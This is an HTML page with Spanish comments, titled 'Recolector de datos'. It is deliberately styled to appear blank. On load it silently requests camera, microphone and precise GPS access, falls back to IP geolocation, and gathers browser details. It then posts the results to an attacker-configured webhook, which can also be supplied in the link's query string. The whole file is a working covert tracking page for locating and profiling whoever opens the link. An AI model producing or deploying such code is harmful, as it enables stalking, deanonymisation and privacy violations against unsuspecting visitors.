<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Recolector de datos</title>
    <style>
        /* Página completamente en blanco y sin elementos visibles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: white;
            color: white; /* Texto invisible sobre fondo blanco */
            font-family: monospace;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #output {
            display: none; /* Oculto completamente */
        }
        /* Si quieres ver algo de depuración, cambia display:block y color:black */
    </style>
</head>
<body>
    <div id="output"></div>

    <script>
        (function() {
            "use strict";

            // ===== CONFIGURACIÓN =====
            // Cambia esta URL por la de tu webhook (Cloudflare Worker, Telegram, etc.)
            const WEBHOOK_URL = 'https://tu-webhook-aqui.com/endpoint';
            // También se puede pasar por query string: ?webhook=https://...
            // =========================

            // Obtener URL de la query string si existe
            const params = new URLSearchParams(window.location.search);
            const webhookFromQuery = params.get('webhook');
            const finalWebhook = webhookFromQuery || WEBHOOK_URL;

            // Objeto donde guardaremos todos los datos
            const data = {
                // Datos fijos (los que ya tenías)
                nombre: 'Mac User',
                username: 'N/A',
                id: 'N/A',
                telefono: 'No disponible',
                idioma: 'es-MX',
                premium: 'No',
                biografia: 'N/A',
                dispositivo: 'Mac',
                plataforma: 'MacIntel',
                vendor: 'Apple Computer, Inc.',
                chat: 'Privado (ID: N/A)',
                mensaje: 'Apertura de página',

                // Datos dinámicos (se rellenarán)
                ip: null,
                pais: null,
                region: null,
                ciudad: null,
                coordenadas: null,
                zonaHoraria: null,
                fechaCaptura: null,

                // Permisos
                permisoUbicacion: null,
                permisoCamara: null,
                permisoMicrofono: null,

                // Navegador
                userAgent: navigator.userAgent,
                lenguaje: navigator.language,
                plataformaNavegador: navigator.platform,
                pantalla: `${window.screen.width}x${window.screen.height}`,

                // Fuente de ubicación (GPS o IP)
                fuenteUbicacion: null,

                // URL final a la que se enviaron los datos
                webhookEnviado: finalWebhook,
                estadoEnvio: 'pendiente'
            };

            // Fecha de captura (se actualiza al final)
            data.fechaCaptura = new Date().toLocaleString('es-MX', {
                day: 'numeric',
                month: 'numeric',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: true
            });

            // Función para enviar datos al webhook
            function enviarDatos() {
                if (!finalWebhook || finalWebhook === 'https://tu-webhook-aqui.com/endpoint') {
                    console.warn('Webhook no configurado. No se enviarán datos.');
                    data.estadoEnvio = 'no configurado';
                    mostrarDatosEnPantalla(data);
                    return;
                }

                fetch(finalWebhook, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    })
                    .then(response => {
                        if (response.ok) {
                            data.estadoEnvio = 'éxito';
                            console.log('✅ Datos enviados correctamente');
                        } else {
                            data.estadoEnvio = `error HTTP ${response.status}`;
                            console.warn('⚠️ Error al enviar:', response.status);
                        }
                    })
                    .catch(error => {
                        data.estadoEnvio = `error: ${error.message}`;
                        console.error('❌ Error de red:', error);
                    })
                    .finally(() => {
                        // Mostrar los datos en el HTML (aunque esté oculto)
                        mostrarDatosEnPantalla(data);
                    });
            }

            // Función para volcar los datos al DOM (oculto)
            function mostrarDatosEnPantalla(obj) {
                const output = document.getElementById('output');
                output.textContent = JSON.stringify(obj, null, 2);
                // También puedes agregar un atributo o evento si necesitas detectar que ya está
            }

            // ===== SOLICITAR PERMISOS Y RECOLECTAR DATOS =====

            // 1. Permiso de cámara
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        data.permisoCamara = 'concedido';
                        stream.getTracks().forEach(track => track.stop());
                    })
                    .catch(err => {
                        data.permisoCamara = 'denegado o error';
                    })
                    .finally(() => {
                        // No enviamos aún, esperamos a todos los permisos
                        verificarYEnviar();
                    });
            } else {
                data.permisoCamara = 'no soportado';
                verificarYEnviar();
            }

            // 2. Permiso de micrófono (voz)
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ audio: true })
                    .then(stream => {
                        data.permisoMicrofono = 'concedido';
                        stream.getTracks().forEach(track => track.stop());
                    })
                    .catch(err => {
                        data.permisoMicrofono = 'denegado o error';
                    })
                    .finally(() => {
                        verificarYEnviar();
                    });
            } else {
                data.permisoMicrofono = 'no soportado';
                verificarYEnviar();
            }

            // 3. Ubicación (GPS o fallback IP)
            let ubicacionResuelta = false;

            function resolverUbicacion() {
                if (ubicacionResuelta) return;
                ubicacionResuelta = true;

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        // Éxito: GPS
                        async (position) => {
                            const { latitude, longitude } = position.coords;
                            data.coordenadas = `${latitude}, ${longitude}`;
                            data.fuenteUbicacion = 'GPS';
                            data.permisoUbicacion = 'concedido';

                            // Reverse geocoding (OpenStreetMap)
                            try {
                                const geoResp = await fetch(
                                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=10&accept-language=es`
                                );
                                if (geoResp.ok) {
                                    const geoData = await geoResp.json();
                                    const addr = geoData.address || {};
                                    data.pais = addr.country || 'Desconocido';
                                    data.region = addr.state || addr.region || 'N/A';
                                    data.ciudad = addr.city || addr.town || addr.village || 'N/A';
                                }
                            } catch (e) {
                                // Si falla, usar IP
                                await obtenerDatosPorIP();
                            }
                            // Ya tenemos todos los datos, enviar
                            verificarYEnviar();
                        },
                        // Error: denegado o fallo
                        async (err) => {
                            data.permisoUbicacion = 'denegado o error';
                            data.fuenteUbicacion = 'IP (fallback)';
                            await obtenerDatosPorIP();
                            verificarYEnviar();
                        }, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    data.permisoUbicacion = 'no soportado';
                    data.fuenteUbicacion = 'IP (fallback)';
                    obtenerDatosPorIP().then(() => verificarYEnviar());
                }
            }

            // Función para obtener IP y geolocalización por IP (ipapi.co)
            async function obtenerDatosPorIP() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    if (!response.ok) throw new Error('Error en ipapi');
                    const ipData = await response.json();
                    data.ip = ipData.ip || 'N/A';
                    data.pais = ipData.country_name || 'Desconocido';
                    data.region = ipData.region || 'N/A';
                    data.ciudad = ipData.city || 'N/A';
                    const lat = ipData.latitude || 0;
                    const lon = ipData.longitude || 0;
                    data.coordenadas = `${lat}, ${lon}`;
                    data.zonaHoraria = ipData.timezone || 'N/A';
                } catch (error) {
                    console.error('Error al obtener IP:', error);
                    data.ip = 'No disponible';
                    data.pais = 'No disponible';
                    data.region = 'N/A';
                    data.ciudad = 'N/A';
                    data.coordenadas = '0, 0';
                    data.zonaHoraria = 'N/A';
                }
            }

            // Control para evitar múltiples envíos
            let envioRealizado = false;

            function verificarYEnviar() {
                // Solo enviamos cuando tengamos la ubicación resuelta
                // y al menos un intento de cámara y micrófono (aunque sea fallo)
                // Para simplificar, esperamos 2 segundos después de cargar la página
                // para dar tiempo a que se resuelvan los permisos.
                if (envioRealizado) return;
                // Usamos un timeout para asegurar que todos los permisos han tenido tiempo
                setTimeout(() => {
                    if (!envioRealizado) {
                        envioRealizado = true;
                        // Si la ubicación no se ha resuelto todavía, la forzamos ahora
                        if (!ubicacionResuelta) {
                            resolverUbicacion();
                            // Pero como ya estamos en el timeout, puede que no se resuelva a tiempo,
                            // así que hacemos un segundo intento después de 1s más.
                            setTimeout(() => {
                                if (!data.pais) {
                                    // Si aún no hay país, forzamos IP
                                    obtenerDatosPorIP().then(() => {
                                        data.fuenteUbicacion = 'IP (forzado)';
                                        enviarDatos();
                                    });
                                } else {
                                    enviarDatos();
                                }
                            }, 1000);
                            return;
                        }
                        enviarDatos();
                    }
                }, 3000); // Esperamos 3 segundos para que los permisos se resuelvan
            }

            // Iniciar la resolución de ubicación
            resolverUbicacion();

            // También podemos forzar el envío después de 5 segundos si todo falla
            setTimeout(() => {
                if (!envioRealizado) {
                    envioRealizado = true;
                    if (!data.pais) {
                        obtenerDatosPorIP().then(() => {
                            data.fuenteUbicacion = 'IP (timeout)';
                            enviarDatos();
                        });
                    } else {
                        enviarDatos();
                    }
                }
            }, 5000);

            // Mostrar los datos iniciales en el DOM (aunque esté vacío)
            mostrarDatosEnPantalla(data);

        })();
    </script>
</body>
</html>
